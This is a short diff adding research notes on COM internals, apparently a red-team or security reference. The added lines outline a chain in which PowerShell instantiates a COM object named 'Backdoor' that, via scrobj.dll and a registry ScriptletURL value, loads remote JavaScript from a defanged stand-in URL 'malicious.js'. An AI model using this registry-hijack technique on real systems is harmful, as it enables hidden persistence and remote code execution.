@@ -1,1 +1,4 @@
 http://thrysoee.dk/InsideCOM+/ch05e.htm
+
+[Currently] Powershell.exe -> $s = New-Object -Com "Backdoor" -> scrobj.dll -> Registry -> [Interwebs] -> hxxp://example.com/malicious.js
+HKEY_CLASSES_ROOT\CLSID\{GUID}\ScriptletURL Holds the url to the COM definition. And the actual JS
